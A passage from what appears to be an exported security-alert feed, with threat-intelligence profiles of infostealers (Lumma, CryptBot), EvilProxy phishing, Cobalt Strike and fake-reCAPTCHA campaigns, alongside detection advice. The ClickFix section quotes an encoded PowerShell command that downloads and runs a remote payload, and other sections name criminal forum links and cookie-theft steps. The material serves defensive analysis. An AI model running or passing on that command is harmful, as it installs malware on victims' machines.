Spider\n\n\n\n# Course of action: \n\n* Cobalt Strike can be dropped in victims systems following phishing campaigns leveraging VBS scripts. It is recommended to disable document macro in MS office. Training users to notice malicous emails should also be performed on a regular basis. \n\n* Cobalt Strike payload can be delivered as a powershell script. It is recommended to restrict powershell script execution to allow signed scripts only.\n\n* Some Cobalt Strike payload signatures can be identified by antivirus. It is recommended to have a good antivirus product.\n\n* Cobalt strike beacons generate abnormal behaviors that can be hunted using Sysmon, Security, PowerShell and WMI logs: \n\t* It is recommended to hunt for parent processes spawning unexpected child processes.\n\t* Hunt for processes behaving abnormally. ex: rundll32.exe establishing a network connection without any command line arguments. \n\t* Monitor suspicious modifications to registry keys, startup folders, task scheduler and service execution.\n\t* Hunt for Anonymous and named pipes known to be specific to Cobalt Strike beacons communication.\n\n* If you have been infected by Cobalt Strike, it is recommended to carry out memory forensics. The tool [CobaltStrikeScan](https://github.com/Apr4h/CobaltStrikeScan) available on github scan for files and process memory for Cobalt Strike beacons and parse their configuration. It scans Windows process memory for evidence of DLL injection.",
                "ttps": [
                    {
                        "id": "malware--364288a5-f3f6-44df-9fc0-0722ed453d77",
                        "type": "malware",
                        "name": "CryptBot",
                        "description": "CryptBot is an infostealer capable of obtaining credentials for browsers, crypto currency wallets, browser cookies, credit cards, and creates screenshots of the infected system. All stolen data is bundled into a zip-file that is uploaded to the c2.\n\nCryptBot provides access to a statistics panel for guests to check infected systems worldwide, and it would seem that more than 600 entries per hour are added. \n\nAccording to Google, CryptBot infected approximately 670,000 computers in 2022. The same source assess several of CryptBot’s major distributors are based in Pakistan and operate a worldwide criminal enterprise.\n\nIn April 2023, a U.S. Court issued a lawsuit targeting Cryptbot’s malware distributors by allowing Google to take down current and future domains tied to the distribution of CryptBot, in order to slow new infections."
                    },
                    {
                        "id": "malware--5cb8e69f-b139-4986-adc0-50e19cfbcf4a",
                        "type": "malware",
                        "name": "Lumma",
                        "description": "## Resume\n\nFirst seen in August 2022, Lumma is an information stealer written in C using WinApi functions. In late 2022 a new version (LummaC2) was released on underground forums. Lumma is sold and distributed as a Malware-as-a-Service. According to the [threat actor advertising the LummaC2 on cybercrime forums](/intelligence/objects/threat-actor--af95847c-0de9-4f76-8007-986f0cc56a70), it is forbidden the stealer is not distrbuted in Russia and Belarus.\n\nLumma's capabilities are those of a classic stealer, with a focus on cryptocurrency wallets. Here are the main capabilities:\n* Targeting of browsers (to steal passwords, cookies, autofills and credit cards);\n* Targeting of Desktop cryptocurrency wallets and extension for cryptocurrency wallets (Exodus, Binance, Electrum, Electrum LTC, Etherum, Jaxx, ElectronCash);\n* Listing running processes.\n\nAs Mars Stealer and Vidar do, Lumma downloads legitimate third-party libraries for data collection into compromised hosts (`sqlite3.dll`, `nss3.dll`, `mozglue.dll`, `freebl3.dll` and `softokn3.dll`).\n\nLumma is sold as a Malware-as-a-Service (MaaS) by LummaC on Russian-speaking underground forums (such as XSS and RAMP) and Telegram. \n* LummaC: hxxps://xssforumv3isucukbxhdhwz67hoa5e2voakcfkuieq4ch257vsburuid.]onion/threads/71739/\n* LummaC2: hxxps://xssforumv3isucukbxhdhwz67hoa5e2voakcfkuieq4ch257vsburuid.]onion/threads/78553/\n* LummaC2: hxxp://rampjcdlqvgkoz5oywutpo6ggl7g6tvddysustfl6qzhr5osr24xxqqd.]onion/threads/lummac2-universal-stealer-a-malware-for-professionals.1099/\n* LummaC2: hxxps://darkmarket.]sx/threads/lummac2-universalnyj-stiller-instrument-dlja-professionalov.55047/\n\n\nOne of its alleged developpers is [c0d3r_0f_shr0d13ng3r](/intelligence/objects/threat-actor--e99c4590-751b-4b09-ab2d-3c06547806d9), a possible contributor for the LummaC project, advertised by the [Shamel](/intelligence/objects/threat-actor--af95847c-0de9-4f76-8007-986f0cc56a70) threat actor.\n\n## Analysis\n\n_The following technical analysis is based on the sample `7873dddec4a46e7ad104de9b6bd68f590575b7680a1d20b9fe1329d1ad95348f`, first seen in the wild on August 11, 2022, which would correspond to a version under development._\n\n### Step-by-step execution\n\nHere is an overview of the step-by-step execution of the Lumma stealer:\n1. The malware sends the string `ct_start` using an HTTP POST request (URI /windbg) to its C2 server, probably to initiate the communication.\n2. It then sends the string `chr_start` using an HTTP POST request (URI /windbg) to its C2 server, before downloading the legitimate third-party DLL `sqlite3.dll` by sending an HTTP GET request to `/lib/sqlite3.dll`.\n3. Lumma then sends the string `moz_start` using an HTTP POST request (URI /windbg) to its C2 server, before downloading the other legitimate third-party DLLs `nss3.dll`, `mozglue.dll`, `freebl3.dll` and `softokn3.dll`.\n4. Once DDLs are downloaded, the malware sends the string `grb_start` using an HTTP POST request (URI /windbg) to its C2 server to indicate it will start to grab information.\n5. It then collects data from web browsers and Desktop crypto wallets, lists the running processes on the infected host.\n6. Collected data is stored in `ProgramData\\config.txt` and then compressed in a zip file named `winrarupd.zip`.\n7. It sends the string `upl_start` to its C2 server, again HTTP POST request on /windb, to indicate it will start to upload data.\n8. The malware then exfiltrates the archive to the C2 server using a HTTP POST request (URI /winsock).\n\nThe malware updated its capabilities since version 4.0:\n- **Control Flow Flattening** (CFF) obfuscation implemented\n- New **Anti-Sandbox** technique to delay detonation of the sample until **human mouse** activity is detected.\n-  **Strings** are now **XOR** obfuscated instead of simply modified by adding junk strings in the middle.\n- Supports dynamic configuration files retrieved from the C2, where the configuration is **Base64** encoded and **XORed** with the first 32 bytes of the configuration file.\n\nThe developer enforces threat actors to use a crypter for their builds.\n\nSide note about the CFF: Lumma changed it CFF technique regulary in the different versions. The control flow is modified by a sort of large state machine where in some version the state are constante and in newer version they are pushed on the stack.\n\n![](https://app.sekoia.io/api/v2/inthreat/images/f136385fdd74140122880e20a56a6d4ed247151ba8c2ea5b78ccc94feda4c244.png)\n\n### Lumma administration panel\n\n![](https://app.sekoia.io/api/v2/inthreat/images/d574da684eb4efaf50a04a02b3b5ce73968666352870d850031fef586d1b8022.png)\n\n### Google Chrome data harvesting\n\nIn July 2024, Google updated the protection mechanism for cookies stored within Chrome on Windows. Shortly afterwards, the developer of Lumma stealer implemented changes to collect Google Chrome cookies using elevated COM with injection bypass.\n\nThe following analysis is based on the Elastic report, \"*Katz and Mouse Game: MaaS Infostealers Adapt to Patched Chrome Defenses*\".\n\nTo bypass Google Chrome's cookie protection, the malware executes the following steps:\n* It creates a Chrome process using `CreateProcessW`\n* It calls `NtReadVirtualMemory` to find the Chome process for `chrome.dll`\n* It copies the `chrome.dll` to its own process memory using `NtReadVirtualMemory`.\n* It uses signature pattern to identify CookieMonster, an internal component used to manage cookies.\n* It identifies cookies in memory and dumps out in clear text from the Chrome Process.\n\n## Tracking the C2 infrastructure\n\n_The following content is from September 2023 and is taken from the report [FLINT 2023-033 - Tracking the C2 infrastructures of the prevalent infostealer families](/intelligence/objects/report--1b3f4bf9-e607-48ca-a7a6-f0abb972aba2). The heuristics mentioned may change over time._\n\n### URL-based heuristic\n\nLumma samples communicate with their C2 domains using HTTP to:\n* Register on its C2 server using a GET request to the root “/”;\n* Retrieve its encrypted configuration from its C2 server using a POST request to “/c2conf”;\n* Exfiltrate harvested data using POST requests to “/c2sock”.\n\nA basic heuristic based on the URL pattern stems from the Lumma C2 communications. Sekoia.io analysts use a query similar to the following on urlscan:\n* [`filename:( \"c2sock\" OR \"c2conf\") page.status:200`](https://urlscan.io/search/#filename%3A(%20%22c2sock%22%20OR%20%22c2conf%22)%20page.status%3A200)\n\n### Cloudflare DNS records\n\nLumma’s C2 domains are hosted by Cloudflare since the end of June 2023. By correlating the DNS NS records, the SSL issuers, registrar information and the top-level domains (TLDs), we retrieved over 200 domains associated with Lumma C2 servers.\n\nFor all domains, URLs to the root return a characteristic HTML web page containing Russian text. By pivoting on the HTML content, we found the possible C2 servers using the following query on Shodan. They are highly likely behind the Cloudflare-protected domains:\n\n* [`http.title:\"Есенин\" http.html:\"Ты меня не любишь\"`](https://beta.shodan.io/search?query=http.title%3A%22%D0%95%D1%81%D0%B5%D0%BD%D0%B8%D0%BD%22+http.html%3A%22%D0%A2%D1%8B+%D0%BC%D0%B5%D0%BD%D1%8F+%D0%BD%D0%B5+%D0%BB%D1%8E%D0%B1%D0%B8%D1%88%D1%8C%22)\n"
                    },
                    {
                        "id": "malware--01ce73f6-d122-4cf5-ab9d-fa46a4db1301",
                        "type": "malware",
                        "name": "EvilProxy",
                        "description": "## Summary\n\n**EvilProxy** tool is advertised as a security awareness **Phishing-as-a-Service** (PhaaS) program since August 2020. It is possible that the tool went through further development since then.\n<br>\n\nWhile EvilProxy is presented as a security awareness tool, SEKOIA assess it is currently exclusively leveraged by cybercriminal, likely in an attempt to evade Law Enforcement Agencies scrutiny. However, it remains plausible that EvilProxy could be used for legitimate security training purposes\n\n<br>\n\n![](https://app.sekoia.io/api/v2/inthreat/images/58b2ba19457ca835f881f4032b35764b206da76a8f980273d8183429ef36f3c8.png)\n*Image from cybercrime forum*\n\n<br>\n\nEvilProxy uses reverse proxy methods to mimic wanted website:\n\n![](https://app.sekoia.io/api/v2/inthreat/images/adf090771253f17b294535bebb830e593de5c696615d22f6fb6e8519d6a74dcd.png)\n*Explanation of reverse proxy by Microsoft*\n\n<br>\nBased on the resources found on forums, Youtube promotional videos, and technical analysis here are a few functionalities of the tool:\n\n<br>\n\n## Functionalities\n### Pricing\nPricing on cybercrime forums are advertised in dollar and depends on the mimicked website:\n\nLicence validity/ Price\n10 days : 150/250 $\n20 days: 250/450 $\n31 days :400/600 $\n<br>\n\n### Installation\nDedicated Youtube videos are available to help clients set up their servers, with step by step guide to download and install the program, to register domains on NameCheap, and to hide via cloudflare DNS service.\n<br>\n\n### Setting up\nOnce the server is installed, users can create a new “campaign” in the program interface. Once “scope” (domain to mimic) of the campaign is determined, users can configure “streams” to redirect unwanted traffic (such as search engine bots). \n\nObserved available domains at the time of writing for phishing website are: Google.com, microsoft, icloud.com, dropbox.com, linkedin.com, yandex.ru, facebook.com, yahoo.com, twitter, wordpress.com, pypi.org, www.npmjs.com, rubygems.org, instagram.com\n<br>\n\n### Phishing pages\nOnce a “campaign” is created, subdomain of clients will serve phishing pages. All the data from the targeted website go through the proxy set up during the installation phase. \n\nTargets experience the same interaction as they would with the legitimate website, including sent URL parameters which are similar. This program can also mimic 2FA pages and collect 2FA codes. Victims can only notice they are on a phishing website via the FQDN in the browser URL bar.\n<br>\n\n### Analyse stolen data\nCustomers can visualize stolen data and logs through the program web interface, and get cookie connections from the victim to connect to compromised accounts.\n\n<br>\n\n### Infrastructure overview\nFrom an exterior perspective, infrastructure looks as follows. This was confirmed by analysis of the docker image provided by the tool’s author.\n* Open port TCP/443: exposing a default certificate when no “Host” header provided in the request\nCertificate is self signed with following fields for Issuer and Subject: “C=US, ST=Denial, L=Springfield, O=Dis, CN=www.nginx.com”. The validity of the certificate is set to 365 days.\n\n**Note**: This certificate will not be displayed to targets as they are directed to the domain directly. \nThe server displays a valid Let’s Encrypt certificate for all subdomains to the target. (Wildcard certificate)\n* Open port TCP/3128: port used by the proxy server\n* Open port TCP/8090: yielding  a 404 error {\"status\":404,\"error\":\"some issue\"}\n\n<br>\n\n## Advertising\n### Telegram\nTelegram channel: `t[.]me/evil_proxy`\n\n### Cybercrime forum links\nXSS selling post: hxxps://xssforumv3isucukbxhdhwz67hoa5e2voakcfkuieq4ch257vsburuid[.]onion/posts/494395/\n\nExploit selling post: hxxps://forum.exploit[.]in/topic/182135/\nFirst post August 2020: hxxps://forum.exploit[.]in/topic/175409/\n<br>\n\n### Youtube channel\nYoutube channel link: hxxps://www[.]youtube[.]com/channel/UC8FnRhoboe92dwVJMbXBYhw (Dead)\n\nAvailable videos on 2022-09-13:\n\n![](https://app.sekoia.io/api/v2/inthreat/images/76531d910d1a52e3a459f497e1dab47178c073264c37532b8c798e13f52c6b4f.png) \n![](https://app.sekoia.io/api/v2/inthreat/images/a575927e19b6dffb6d68a2c63d3b994272c76df32e0590e026089cee9d74d825.jpeg) \n![](https://app.sekoia.io/api/v2/inthreat/images/ac400c75a7cffe33ad3250ce0aa87de7d5e2ba46c07e0ce2c7f79d67fd3de957.jpeg)\n\n## Customer panel\n### Clear web\nPanel on clear web is no more accessible:\n`cpanel[.]evilproxy[.]pro`:\n\n![](https://app.sekoia.io/api/v2/inthreat/images/7922e42522cc0b413167be7f5ddaa9d96e111ec12dd5fdab4d5c5ebbaff9a559.png)\n\n### Onion\n`cpanel[.]pua75npooc4ekrkkppdglaleftn5mi2hxsunz5uuup6uxqmen4deepyd[.]onion`\n\n![](https://app.sekoia.io/api/v2/inthreat/images/1517ca8a8e314dea3b2596bfbe7f439b6c27951e0c177648e0db3f700fc7f6da.png)\n"
                    },
                    {
                        "id": "malware--39304fbf-d301-47c3-ab06-7c96e5eb4c9b",
                        "type": "malware",
                        "name": "Cobalt Strike",
                        "description": "\n![](https://app.sekoia.io/api/v2/inthreat/images/8ab8446370cd0672b068a02511886aacfce36f2ba8a3018fdff3c15dadeaae1d.png)\n\n# Cobalt Strike, the Swiss Army Knife Framework: \n\nCobalt Strike is a paid penetration-testing tool that anyone can use. It is ubiquitous in the cyber security arena. It’s a prolific toolkit used at many levels of intrusion to solve adversaries' problems like post-intrusion exploitation, beaconing for command and control (C2s), stealth and reconnaissance. \n\nCobalt Strike is a modularized attack framework: Each module fulfills a specific function and stands alone. It’s hard to detect, because its components might be customized derivatives from another module, new, or completely absent. \n\nOver the last two years, malicious threat actors have managed to crack fully-featured versions of Cobalt Strike and made them widely available within dark web marketplaces and forums. Malicious actors find Cobalt Strike’s obfuscation techniques and robust tools for C2, stealth and data exfiltration particularly attractive.\n\nCobalt Strike is a favorite because it’s stable and highly flexible. It can be repurposed to deploy all manner of payloads, like ransomware or keylogger, to the compromised network. It is well organized and provides a framework to manage compromised assets. Essentially, this tool helps the ‘B list’ act like ‘A list’ hackers.\n\nCobalt Strike Cat is a modified version of Cobalt Strike 4.5.\n\n# Cobalt Strike architecture:\n\nThe C2 server is the Team Server, the client interface is the Aggressor, and the payload is the Beacon.\nThe listening port on the C2 server is configured through a listener.\n\nMalicious actors have used it for years to deploy “Beacon” on victim machines.\n\nListeners are at the core of Cobalt Strike. They allow adversaries to configure the C2 method used in an attack. Every attack or payload generated in Cobalt Strike requires the targeted user to select a Listener to embed within it. This will determine how an infected host will reach out to the C2 server to retrieve additional payloads and instructions. When creating a listener, the user can configure the payload type, name, C2 server and port, and other various options such as named pipes or proxy servers. \n\nUsers can choose from: \n\n* Beacon DNS\n* Beacon HTTP\n* Beacon HTTPS\n* Beacon SMB\n* Beacon TCP\n* External C2\n* Foreign HTTP\n* Foreign HTTPS\n\nPotentially the most powerful aspect of Cobalt Strike is the array of malleable C2 profiles, which allows users to configure how attacks are created, obfuscate and manage the flow of execution at a very low level.There are several ways to visualize how an adversary interacts with infected Cobalt Strike hosts, such as a session table, pivot graph, or a target table.\n\n![](https://app.sekoia.io/api/v2/inthreat/images/cc77e1ef9a2303f6d174356740c3b58035b8135c3af26ee3b2e78fe92c5894ef.png)\nFigure: Cobalt Strike Listener console\n\n![](https://app.sekoia.io/api/v2/inthreat/images/2fdff8807c594da834ec79ef89a37164ae80de6e9b937d6d37e8b0733dce3299.png)\nFigure: Cobalt Strike session table\n\n\n\n# Web Management: \n\nCobalt Strike delivers exploits and/or malicious payloads using an attacker-controlled web server. The web server can be configured to perform the following actions:\n\n* Host files\n* Clone an existing website to trick users\n* Scripted web delivery\n* Signed Applet Attack (Java)\n* Smart Applet Attack (Java)\n* System profiling\n\nWhen a victim reaches out to the Cobalt Strike web server, it’s logged for operators.\n\n# Customization: \n\nAlmot every feature is customizable through different mechanisms:\n\n* Arsenal Kits:\n\t* [Artificat Kit](https://www.cobaltstrike.com/help-artifact-kit): to modify Windows binaries templates\n\t* [Elevate Kit](https://www.cobaltstrike.com/help-elevate): to integrate privilege exploits\n\t* [Resource Kit](https://www.cobaltstrike.com/help-resource-kit): modify script payload (e.g. powershell)\n* [Malleable Profile](https://www.cobaltstrike.com/help-malleable-c2): modify C2 server and beacon behavior \n* [Aggressor Scripts](https://www.cobaltstrike.com/help-scripting): scripting language allowing multiple action on the client interface\n* [Beacon Object Files (BOFs)](https://www.cobaltstrike.com/help-beacon-object-files): extend post-exploitation functionnality\n\n\n\n# Intrusion Sets that use Cobalt Strike: \n\nIn 2020 Q3, Cobalt Strike was leveraged in more than 66% of performed attacks. It is used by cybercriminals groups as well as State-nexus intrusion sets, including :\n\n* APT19\n* APT29\n* Leviathan\n* CopyKittens\n* APT32\n* UNC2452\n* APT41\n* Chimera\n* DarkHydrus\n* Cobalt Group\n* FIN6\n* Wizard Spider\n\n\n\n# Course of action: \n\n* Cobalt Strike can be dropped in victims systems following phishing campaigns leveraging VBS scripts. It is recommended to disable document macro in MS office. Training users to notice malicous emails should also be performed on a regular basis. \n\n* Cobalt Strike payload can be delivered as a powershell script. It is recommended to restrict powershell script execution to allow signed scripts only.\n\n* Some Cobalt Strike payload signatures can be identified by antivirus. It is recommended to have a good antivirus product.\n\n* Cobalt strike beacons generate abnormal behaviors that can be hunted using Sysmon, Security, PowerShell and WMI logs: \n\t* It is recommended to hunt for parent processes spawning unexpected child processes.\n\t* Hunt for processes behaving abnormally. ex: rundll32.exe establishing a network connection without any command line arguments. \n\t* Monitor suspicious modifications to registry keys, startup folders, task scheduler and service execution.\n\t* Hunt for Anonymous and named pipes known to be specific to Cobalt Strike beacons communication.\n\n* If you have been infected by Cobalt Strike, it is recommended to carry out memory forensics. The tool [CobaltStrikeScan](https://github.com/Apr4h/CobaltStrikeScan) available on github scan for files and process memory for Cobalt Strike beacons and parse their configuration. It scans Windows process memory for evidence of DLL injection.\n\n\n"
                    }
                ],
                "adversaries": [
                    {
                        "id": "campaign--0cdb0e42-11d7-40d0-bc29-2c9a37f07dd6",
                        "type": "campaign",
                        "name": "AIZ phishing campaign on e-commerce websites",
                        "description": "In Late 2024, Silent Push researchers observed a phishing campaign targeting multiple e-commerce company such as Etsy, Amazon, BestBuy, eBay, Rakuten, Wayfair, and more. The campaign was conducted by the intrusion-set called Aggressive Inventory Zombies (aka AIZ). AIZ has been using a popular website template to build phishing websites, and appears to primarily conduct phishing activities over chat services integrated into the sites.\n\nOn these fake e-commerce websites, the “Contact info” email includes a fake email address such as `etsys6151@gmail[.]com` and the payment methods includes cryptocurrencies and other methods that are not accepted on the legitimate e-commerce websites. The articles displayed on these websites appears to have been scrapped on other sites.\n\nThe chat widget used on these websites are from crisp.chat. On some of the phishing websites, there is an option \"Register Your Shop” asking for ID card and credentials.\n\nThe intrusion-set also uses a Chinese support tool called “SaleSmartly” which is a popular tool for certain Chinese organizations.\n\nOn some e-commerce websites, the group offer to buy product by bulk of 500 or more which could indicates that they also target businesses.\n\nBy pivoting on IP addresses which registered these domains via Stark Industries, Silent Push researchers found cryptocurrency phishing sites."
                    },
                    {
                        "id": "infrastructure--02ad754d-eaaf-4699-a8bf-2a733fc6e667",
                        "type": "infrastructure",
                        "name": "Fake reCAPTCHA webpages with a blank background",
                        "description": "## Resume\n\nSeveral threat actors are using fake reCAPTCHA challenge to distribute their malware through the ClickFix social engineering tactic.\n\nThe fake reCAPTCHA webpages are designed to lure victims into completing a reCAPTCHA, which then leads them to copy a malicious command in their clipboard data and direct them to paste it into their Windows PowerShell prompt and execute it. This social engineering tactic is commonly referred to as ClickFix.\n\nThis infrastructure object aims at tracking a cluster of malicious websites impersonating reCAPTCHA to distribute malware.\n\n## Analysis\n\n### Example of infection\n\nThe fake reCAPTCHA webpages look like this:\n\n![](https://app.sekoia.io/api/v2/inthreat/images/b4e08b4185e7e6a5bea8bc5f00d91c8c1ad43cb1605f8e5a0ecf5ab0d7773b5f.png)\n\nWhen clicking on the button, the user is asked to follow verification steps on their computer:\n\n![](https://app.sekoia.io/api/v2/inthreat/images/dd5b77c2bf2a56788f41b88ee3f4d94f0391ad57e4cea290199cd841ce11db70.png)\n\nThis leads to PowerShell execution. The command can be base64-encoded or not, _e.g._ \n```\npowershell -W Hidden -eC aQBlAHgAIAAoAGkAdwByACAAaAB0AHQAcABzADoALwAvAGIAaQB0AC4AbAB5AC8ANABlAHEAZgBYAHQAZwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAuAEMAbwBuAHQAZQBuAHQA\n```\nDecoded into:\n```\niex (iwr https://bit.ly/4eqfXtg -UseBasicParsing).Content\n```\n\nAs of November 2024, payloads were primarily hosted on the following CDN:\n * b-cdn[.]net\n * exo[.]io\n * liyuncs[.]com\n * contabostorage[.]com\n\nIn January 2025, Sekoia analysts identified that the threat actors now primarily use `.shop` domains to host the malicious reCAPTCHA webpages. \n\n### PowerShell execution\n\nAs of November 2024, here are the different steps of the PowerShell execution\n\n1. Download a TXT file from a first URL (optionnal), which contains additional PowerShell code\n2. Download a ZIP file from another URL\n3. Decompress the ZIP archive and execute the malicious payload\n\nThe following is an illustration from McAfee:\n\n![](https://app.sekoia.io/api/v2/inthreat/images/93573d013442c407a02f5d9ee831dc77fa014e74a086a3c34a50cf50b5f1e9ee.png)\n\nThe final payloads observed are:\n- Emmenthal ( as Loader )\n- Lumma\n\nFinal payload URL & domains are linked to **[Domains hosting malicious payloads after fake captcha](https://app.sekoia.io/objects/infrastructure--4e393693-1c0a-4fd5-ae72-e9675a628dd1) infrastructure**"
                    }
                ],
                "stix": {},
                "kill_chain_short_id": "KCDbEkmkMciY",
                "first_seen_at": "2024-10-25T18:31:18.063143Z",
                "last_seen_at": "2025-03-17T15:03:42.417292Z",
                "assets": [
                    "681c6825-bd45-4a96-a6ed-6a974ae6f3ff",
                    "9f83469f-5afa-4b3e-af9f-5d1ec9eddb0e"
                ],
                "time_to_detect": 5,
                "time_to_acknowledge": None,
                "time_to_respond": None,
                "time_to_resolve": None,
                "intake_uuids": [
                    "6ec6c3f6-99dd-484f-b106-4ece3d680347"
                ]
            },
            {
                "uuid": "21735fa0-3d6e-4a5a-a294-d3f83c3f42de",
                "title": "SEKOIA Intelligence Feed",
                "created_at": 1730304600,
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "created_by_type": "application",
                "updated_at": 1730304600,
                "updated_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "updated_by_type": "application",
                "community_uuid": "52bd045f-4199-4361-8267-cdebfc784392",
                "short_id": "AL8PAHCXsjqh",
                "entity": {
                    "uuid": "7f7676e7-a254-43c3-acf6-1b920a94fe51",
                    "name": "Information Technology Rennes site"
                },
                "urgency": {
                    "current_value": 60,
                    "value": 60,
                    "severity": 60,
                    "criticity": 0,
                    "display": "Major"
                },
                "alert_type": {
                    "value": "malware",
                    "category": "malicious-code"
                },
                "status": {
                    "uuid": "2efc4930-1442-4abb-acf2-58ba219a4fd0",
                    "name": "Pending",
                    "description": "The alert is waiting for action"
                },
                "rule": {
                    "uuid": "654dac66-b35a-4d7d-822e-05cd3e4be2a2",
                    "name": "SEKOIA Intelligence Feed",
                    "severity": 60,
                    "type": "cti",
                    "pattern": "[network-traffic:dst_ref.value = '170.130.55.31']"
                },
                "detection_type": "CTI",
                "source": "192.168.1.125",
                "target": "170.130.55.31",
                "similar": 0,
                "details": "Detect threats based on indicators of compromise (IOCs) collected by SEKOIA's Threat and Detection Research team.\r\n\r\n# Details\r\n\r\n## Malware: Cobalt Strike\r\n\r\n\n![](https://app.sekoia.io/api/v2/inthreat/images/8ab8446370cd0672b068a02511886aacfce36f2ba8a3018fdff3c15dadeaae1d.png)\n\n# Cobalt Strike, the Swiss Army Knife Framework: \n\nCobalt Strike is a paid penetration-testing tool that anyone can use. It is ubiquitous in the cyber security arena. It’s a prolific toolkit used at many levels of intrusion to solve adversaries' problems like post-intrusion exploitation, beaconing for command and control (C2s), stealth and reconnaissance. \n\nCobalt Strike is a modularized attack framework: Each module fulfills a specific function and stands alone. It’s hard to detect, because its components might be customized derivatives from another module, new, or completely absent. \n\nOver the last two years, malicious threat actors have managed to crack fully-featured versions of Cobalt Strike and made them widely available within dark web marketplaces and forums. Malicious actors find Cobalt Strike’s obfuscation techniques and robust tools for C2, stealth and data exfiltration particularly attractive.\n\nCobalt Strike is a favorite because it’s stable and highly flexible. It can be repurposed to deploy all manner of payloads, like ransomware or keylogger, to the compromised network. It is well organized and provides a framework to manage compromised assets. Essentially, this tool helps the ‘B list’ act like ‘A list’ hackers.\n\nCobalt Strike Cat is a modified version of Cobalt Strike 4.5.\n\n# Cobalt Strike architecture:\n\nThe C2 server is the Team Server, the client interface is the Aggressor, and the payload is the Beacon.\nThe listening port on the C2 server is configured through a listener.\n\nMalicious actors have used it for years to deploy “Beacon” on victim machines.\n\nListeners are at the core of Cobalt Strike. They allow adversaries to configure the C2 method used in an attack. Every attack or payload generated in Cobalt Strike requires the targeted user to select a Listener to embed within it. This will determine how an infected host will reach out to the C2 server to retrieve additional payloads and instructions. When creating a listener, the user can configure the payload type, name, C2 server and port, and other various options such as named pipes or proxy servers. \n\nUsers can choose from: \n\n* Beacon DNS\n* Beacon HTTP\n* Beacon HTTPS\n* Beacon SMB\n* Beacon TCP\n* External C2\n* Foreign HTTP\n* Foreign HTTPS\n\nPotentially the most powerful aspect of Cobalt Strike is the array of malleable C2 profiles, which allows users to configure how attacks are created, obfuscate and manage the flow of execution at a very low level.There are several ways to visualize how an adversary interacts with infected Cobalt Strike hosts, such as a session table, pivot graph, or a target table.\n\n![](https://app.sekoia.io/api/v2/inthreat/images/cc77e1ef9a2303f6d174356740c3b58035b8135c3af26ee3b2e78fe92c5894ef.png)\nFigure: Cobalt Strike Listener console\n\n![](https://app.sekoia.io/api/v2/inthreat/images/2fdff8807c594da834ec79ef89a37164ae80de6e9b937d6d37e8b0733dce3299.png)\nFigure: Cobalt Strike session table\n\n\n\n# Web Management: \n\nCobalt Strike delivers exploits and/or malicious payloads using an attacker-controlled web server. The web server can be configured to perform the following actions:\n\n* Host files\n* Clone an existing website to trick users\n* Scripted web delivery\n* Signed Applet Attack (Java)\n* Smart Applet Attack (Java)\n* System profiling\n\nWhen a victim reaches out to the Cobalt Strike web server, it’s logged for operators.\n\n# Customization: \n\nAlmot every feature is customizable through different mechanisms:\n\n* Arsenal Kits:\n\t* [Artificat Kit](https://www.cobaltstrike.com/help-artifact-kit): to modify Windows binaries templates\n\t* [Elevate Kit](https://www.cobaltstrike.com/help-elevate): to integrate privilege exploits\n\t* [Resource Kit](https://www.cobaltstrike.com/help-resource-kit): modify script payload (e.g. powershell)\n* [Malleable Profile](https://www.cobaltstrike.com/help-malleable-c2): modify C2 server and beacon behavior \n* [Aggressor Scripts](https://www.cobaltstrike.com/help-scripting): scripting language allowing multiple action on the client interface\n* [Beacon Object Files (BOFs)](https://www.cobaltstrike.com/help-beacon-object-files): extend post-exploitation functionnality\n\n\n\n# Intrusion Sets that use Cobalt Strike: \n\nIn 2020 Q3, Cobalt Strike was leveraged in more than 66% of performed attacks. It is used by cybercriminals groups as well as State-nexus intrusion sets, including :\n\n* APT19\n* APT29\n* Leviathan\n* CopyKittens\n* APT32\n* UNC2452\n* APT41\n* Chimera\n* DarkHydrus\n* Cobalt Group\n* FIN6\n* Wizard Spider\n\n\n\n# Course of action: \n\n* Cobalt Strike can be dropped in victims systems following phishing campaigns leveraging VBS scripts. It is recommended to disable document macro in MS office. Training users to notice malicous emails should also be performed on a regular basis. \n\n* Cobalt Strike payload can be delivered as a powershell script. It is recommended to restrict powershell script execution to allow signed scripts only.\n\n* Some Cobalt Strike payload signatures can be identified by antivirus. It is recommended to have a good antivirus product.\n\n* Cobalt strike beacons generate abnormal behaviors that can be hunted using Sysmon, Security, PowerShell and WMI logs: \n\t* It is recommended to hunt for parent processes spawning unexpected child processes.\n\t* Hunt for processes behaving abnormally. ex: rundll32.exe establishing a network connection without any command line arguments. \n\t* Monitor suspicious modifications to registry keys, startup folders, task scheduler and service execution.\n\t* Hunt for Anonymous and named pipes known to be specific to Cobalt Strike beacons communication.\n\n* If you have been infected by Cobalt Strike, it is recommended to carry out memory forensics. The tool [CobaltStrikeScan](https://github.com/Apr4h/CobaltStrikeScan) available on github scan for files and process memory for Cobalt Strike beacons and parse their configuration. It scans Windows process memory for evidence of DLL injection.",
                "ttps": [
                    {
                        "id": "malware--39304fbf-d301-47c3-ab06-7c96e5eb4c9b",
                        "type": "malware",
                        "name": "Cobalt Strike",
                        "description": "\n![](https://app.sekoia.io/api/v2/inthreat/images/8ab8446370cd0672b068a02511886aacfce36f2ba8a3018fdff3c15dadeaae1d.png)\n\n# Cobalt Strike, the Swiss Army Knife Framework: \n\nCobalt Strike is a paid penetration-testing tool that anyone can use. It is ubiquitous in the cyber security arena. It’s a prolific toolkit used at many levels of intrusion to solve adversaries' problems like post-intrusion exploitation, beaconing for command and control (C2s), stealth and reconnaissance. \n\nCobalt Strike is a modularized attack framework: Each module fulfills a specific function and stands alone. It’s hard to detect, because its components might be customized derivatives from another module, new, or completely absent. \n\nOver the last two years, malicious threat actors have managed to crack fully-featured versions of Cobalt Strike and made them widely available within dark web marketplaces and forums. Malicious actors find Cobalt Strike’s obfuscation techniques and robust tools for C2, stealth and data exfiltration particularly attractive.\n\nCobalt Strike is a favorite because it’s stable and highly flexible. It can be repurposed to deploy all manner of payloads, like ransomware or keylogger, to the compromised network. It is well organized and provides a framework to manage compromised assets. Essentially, this tool helps the ‘B list’ act like ‘A list’ hackers.\n\nCobalt Strike Cat is a modified version of Cobalt Strike 4.5.\n\n# Cobalt Strike architecture:\n\nThe C2 server is the Team Server, the client interface is the Aggressor, and the payload is the Beacon.\nThe listening port on the C2 server is configured through a listener.\n\nMalicious actors have used it for years to deploy “Beacon” on victim machines.\n\nListeners are at the core of Cobalt Strike. They allow adversaries to configure the C2 method used in an attack. Every attack or payload generated in Cobalt Strike requires the targeted user to select a Listener to embed 